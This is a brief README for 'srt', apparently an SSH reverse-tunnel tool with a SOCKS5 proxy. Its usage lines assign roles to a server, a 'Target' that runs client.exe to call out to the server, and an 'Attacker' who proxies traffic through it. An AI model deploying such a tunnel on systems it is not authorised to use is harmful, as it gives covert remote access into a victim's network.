srt
=========

SSH Reverse Tunnel

![alt text](https://i.imgur.com/jwJ9sC3.png)

---------
****Usage****

 - Server: ./server.elf 0.0.0.0 2222 userssh passssh 0.0.0.0 8080
 
 - Target: client.exe ServerIp 2222  userssh passssh usersocks passsocks
 
 - Attacker: set proxy socks5 ServerIp:8080 with usersocks/passsocks
 
 ---------
 
****Ref****
 
 - http://blog.ralch.com/tutorial/golang-ssh-tunneling/
 - https://blog.gopheracademy.com/go-and-ssh/
 - https://github.com/armon/go-socks5